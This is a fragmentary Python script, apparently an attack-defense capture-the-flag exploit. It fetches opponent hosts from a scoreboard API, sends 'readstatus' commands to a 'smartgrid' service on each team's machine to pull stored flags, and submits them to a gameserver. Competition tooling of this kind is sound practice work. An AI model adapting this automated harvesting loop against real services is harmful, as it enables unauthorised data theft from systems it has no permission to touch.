...
OWNTEAM_ID = 1 
SERVICE_PORT = 21721
SERVICE_IP_VERSION = 4 # 4 = ipv4, 6 = ipv6
SERVICE_NAME = 'smartgrid' # name of the service in the json api
...
def grabAvaiableHosts():
    # grab hosts from scoreboard's json api
    teams = []
    try:
...
def submit(flag):
    try:
        ...
        greet = s.recv(1024)
        if DEBUG: log.debug('gameserver greeting: '+str(greet))
        s.send(flag.strip() + "\n")
        resp = s.recv(1024)
        s.close()
...
def exploit(team_ip):
    try:
        ...
        uuids = string.strip().replace("[", "").replace("]", "").replace("\'", "").split(", ")

        for uuid in uuids[-40:]:
            s.send("readstatus "+uuid+"\n")
            ret = s.recv(4096)

            flag = ret[ret.find("status=")+7:ret.find(" ",ret.find("status"))]
            if DEBUG: log.debug(flag)
            flags.append(flag)
